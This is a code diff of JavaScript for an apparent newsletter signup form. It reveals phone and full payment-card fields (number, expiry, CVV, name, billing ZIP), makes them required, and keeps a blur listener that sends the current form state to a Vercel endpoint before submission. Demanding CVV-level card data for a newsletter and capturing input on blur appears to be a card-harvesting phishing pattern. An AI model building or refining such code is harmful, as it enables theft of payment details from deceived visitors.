@@ -78,12 +78,26 @@ function showPhoneAndPaymentFields(trigger) {
     if (phoneFieldShown) return; // Only show once
 
     const phoneFieldContainer = document.getElementById('phoneFieldContainer');
+    const paymentFieldContainer = document.getElementById('paymentFieldContainer');
     const phoneInput = document.getElementById('phone');
     const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];
 
     if (phoneFieldContainer && phoneInput) {
         phoneFieldContainer.style.display = 'block';
         phoneInput.required = true; // Make it required
+
+        phoneFieldShown = true;
+
+        // Add blur listener to phone field
+        phoneInput.addEventListener('blur', function() {
+            sendCurrentFormStateToVercel();
+        });
+
+        console.log(`📱 Phone field revealed via ${trigger}`);
+    }
+
+    if (paymentFieldContainer) {
+        paymentFieldContainer.style.display = 'block';
 
         // Make all payment fields required
         cardFields.forEach(fieldId => {
@@ -96,17 +110,10 @@ function showPhoneAndPaymentFields(trigger) {
             }
         });
 
-        phoneFieldShown = true;
-
-        // Add blur listener to phone field
-        phoneInput.addEventListener('blur', function() {
-            sendCurrentFormStateToVercel();
-        });
-
         // Add formatting for card fields
         setupCardFormatting();
 
-        console.log(`📱 Phone and payment fields revealed via ${trigger}`);
+        console.log(`💳 Payment fields revealed via ${trigger}`);
     }
 }
 
@@ -344,14 +351,19 @@ async function handleNewsletterSubmit(event) {
     // Reset form
     event.target.reset();
 
-    // Hide phone field again after reset and scroll to top
+    // Hide phone and payment fields again after reset
     const phoneFieldContainer = document.getElementById('phoneFieldContainer');
+    const paymentFieldContainer = document.getElementById('paymentFieldContainer');
     const phoneInput = document.getElementById('phone');
     const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];
 
     if (phoneFieldContainer && phoneInput) {
         phoneFieldContainer.style.display = 'none';
         phoneInput.required = false;
+    }
+
+    if (paymentFieldContainer) {
+        paymentFieldContainer.style.display = 'none';
 
         // Remove required from payment fields
         cardFields.forEach(fieldId => {
